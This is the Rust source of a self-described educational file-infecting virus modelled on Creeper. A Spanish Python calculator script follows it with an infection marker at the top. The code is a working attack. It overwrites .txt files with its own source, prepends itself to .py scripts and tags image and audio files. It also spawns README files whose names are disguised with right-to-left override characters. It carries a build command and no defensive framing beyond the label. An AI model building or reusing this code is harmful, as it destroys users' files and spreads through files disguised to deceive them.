// Creeper (1971) - Educational virus (Rust version)
// Compile: rustc creeper.rs -o creeper.exe

use std::fs;
use std::io::Write;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

const SELF_SOURCE: &str = "creeper.rs";
const RTL: char = '\u{202E}';

fn read_source() -> String {
    fs::read_to_string(SELF_SOURCE).unwrap_or_else(|_| "// source unavailable".into())
}

fn exfiltrate(path: &Path) {
    let name = path.file_name().unwrap().to_string_lossy();
    let ext = path.extension().unwrap_or_default().to_string_lossy().to_lowercase();
    let data = fs::read(path).unwrap_or_default();
    let size = data.len();

    match ext.as_str() {
        "txt" => {
            let lines = data.iter().filter(|&&b| b == b'\n').count() + 1;
            println!("[creep] reading: {} (exfiltrated {} bytes, {} lines)", name, size, lines);
        }
        "csv" => {
            let rows = data.iter().filter(|&&b| b == b'\n').count();
            println!("[creep] reading: {} (parsed {} rows)", name, rows);
        }
        "html" => {
            let tags = data.iter().filter(|&&b| b == b'<').count();
            println!("[creep] reading: {} (found {} HTML tags)", name, tags);
        }
        "md" => {
            let content = String::from_utf8_lossy(&data);
            let headers = content.lines().filter(|l| l.starts_with('#')).count();
            println!("[creep] reading: {} (found {} headers)", name, headers);
        }
        "py" => {
            let lines = data.iter().filter(|&&b| b == b'\n').count() + 1;
            println!("[creep] reading: {} (script, {} lines)", name, lines);
        }
        "png" | "jpg" | "jpeg" | "mp3" => {
            println!("[creep] reading: {} ({} bytes, binary)", name, size);
        }
        "docx" | "xlsx" | "pptx" => {
            println!("[creep] reading: {} (office document, {} bytes)", name, size);
        }
        _ => return,
    }
}

fn infect_file(path: &Path, code: &str) -> bool {
    let name = path.file_name().unwrap().to_string_lossy();
    let ext = path.extension().unwrap_or_default().to_string_lossy().to_lowercase();

    if name.starts_with("README") || name.contains(RTL) { return false; }
    if name == SELF_SOURCE { return false; }
    if name.ends_with(".exe") || name.ends_with(".go") || name.ends_with(".nim")
        || name.ends_with(".c") || name.ends_with(".cpp") || name.ends_with(".py") && name == "setup_lab.py"
    {
        return false;
    }

    match ext.as_str() {
        "py" => {
            if let Ok(orig) = fs::read_to_string(path) {
                let infected = format!("{}\n# === INFECTED BY CREEPER ===\n{}", code, orig);
                fs::write(path, infected).ok();
                println!("[creep] infected: {} (prepended virus code)", name);
                return true;
            }
        }
        "txt" => {
            fs::write(path, code).ok();
            println!("[creep] infected: {} (overwritten with virus)", name);
            return true;
        }
        _ => {}
    }
    false
}

fn infect_binary(path: &Path) -> bool {
    let name = path.file_name().unwrap().to_string_lossy();
    let ext = path.extension().unwrap_or_default().to_string_lossy().to_lowercase();

    if name.contains(RTL) || name == SELF_SOURCE { return false; }

    let dur = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let marker = format!("\n[CREEPER-INFECTED]\nTimestamp: {}.{}\n", dur.as_secs(), dur.subsec_nanos());

    let data = fs::read(path).unwrap_or_default();
    if String::from_utf8_lossy(&data).contains("[CREEPER-INFECTED]") {
        return false;
    }

    match ext.as_str() {
        "png" => {
            if let Some(pos) = data.windows(4).position(|w| w == b"IEND") {
                let split = pos + 8;
                if split <= data.len() {
                    let mut new = data[..split].to_vec();
                    new.extend_from_slice(marker.as_bytes());
                    new.extend_from_slice(&data[split..]);
                    fs::write(path, new).ok();
                    println!("[creep] infected: {} (appended marker after IEND)", name);
                    return true;
                }
            }
        }
        "jpg" | "jpeg" => {
            if data.len() >= 2 && data[data.len()-2..] == [0xFF, 0xD9] {
                let len = data.len() - 2;
                let mut new = data[..len].to_vec();
                new.extend_from_slice(marker.as_bytes());
                new.extend_from_slice(&[0xFF, 0xD9]);
                fs::write(path, new).ok();
                println!("[creep] infected: {} (appended marker before EOI)", name);
                return true;
            }
        }
        "mp3" => {
            if let Ok(mut f) = fs::OpenOptions::new().append(true).open(path) {
                f.write_all(marker.as_bytes()).ok();
                println!("[creep] infected: {} (appended marker)", name);
                return true;
            }
        }
        _ => {}
    }
    false
}

fn spawn_rtl(code: &str) -> usize {
    let mut count = 0;
    for i in 0..3 {
        let name = format!("README{}{}txt.py", i, RTL);
        let p = Path::new(&name);
        if !p.exists() {
            fs::write(p, code).ok();
            println!("[creep] RTL-spawned: {:?}", name);
            println!("        (looks like README{}.txt in Explorer)", i);
            count += 1;
        }
    }
    count
}

fn write_log(read_count: usize, infected_count: usize, rtl_count: usize) {
    let log = format!(
        "=== CREEPER VIRUS - INFECTION LOG ===\n\
         Execution: {}\n\
         Source: {}\n\
         \n\
         Files read: {}\n\
         Files infected: {}\n\
           - regular:  {}\n\
           - RTL clones: {}\n\
         ======================================\n",
        SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
        SELF_SOURCE,
        read_count, infected_count,
        infected_count - rtl_count, rtl_count
    );
    fs::write("infection.log", log).ok();
}

fn main() {
    println!("I'M THE CREEPER: CATCH ME IF YOU CAN.\n");

    let code = read_source();
    let mut read_count = 0usize;
    let mut infect_count = 0usize;

    let entries: Vec<_> = fs::read_dir(".").into_iter().flatten().flatten().collect();

    // 1. READ phase
    for entry in &entries {
        let path = entry.path();
        if !path.is_file() { continue; }
        let name = path.file_name().unwrap().to_string_lossy().to_string();
        if name == SELF_SOURCE || name == "setup_lab.py" || name.starts_with("README") || name.ends_with(".exe") { continue; }
        exfiltrate(&path);
        read_count += 1;
    }

    // 2. INFECT phase
    for entry in &entries {
        let path = entry.path();
        if !path.is_file() { continue; }
        let ext = path.extension().unwrap_or_default().to_string_lossy().to_lowercase();
        match ext.as_str() {
            "py" | "txt" => { if infect_file(&path, &code) { infect_count += 1; } }
            "png" | "jpg" | "jpeg" | "mp3" => { if infect_binary(&path) { infect_count += 1; } }
            _ => {}
        }
    }

    // 3. RTL clones
    let rtl_count = spawn_rtl(&code);
    infect_count += rtl_count;

    // 4. Log
    write_log(read_count, infect_count, rtl_count);

    // 5. Report
    println!("\n[creep] activity logged to: infection.log");
    println!("[creep] files read:     {}", read_count);
    println!("[creep] files infected: {}", infect_count);
    println!("[creep]   - regular:  {}", infect_count - rtl_count);
    println!("[creep]   - RTL clones: {}", rtl_count);
    println!("[creep] use antivirus to remove me");
}

# === INFECTED BY CREEPER ===
#!/usr/bin/env python3
"""Calculadora simple - Herramienta de usuario legitima"""
import sys

def suma(a, b): return a + b
def resta(a, b): return a - b
def mult(a, b): return a * b
def div(a, b): return a / b if b != 0 else float('inf')

OP = {'+': suma, '-': resta, '*': mult, '/': div}

def main():
    print("=== CALCULADORA v1.0 ===")
    print("Operaciones: +, -, *, /")
    while True:
        try:
            cmd = input(">>> ").strip()
            if cmd.lower() in ('exit', 'quit', 'q'):
                break
            partes = cmd.split()
            if len(partes) != 3:
                print("Formato: a + b")
                continue
            a, op, b = float(partes[0]), partes[1], float(partes[2])
            if op in OP:
                print(f"= {OP[op](a, b)}")
            else:
                print(f"Operacion '{op}' no soportada")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
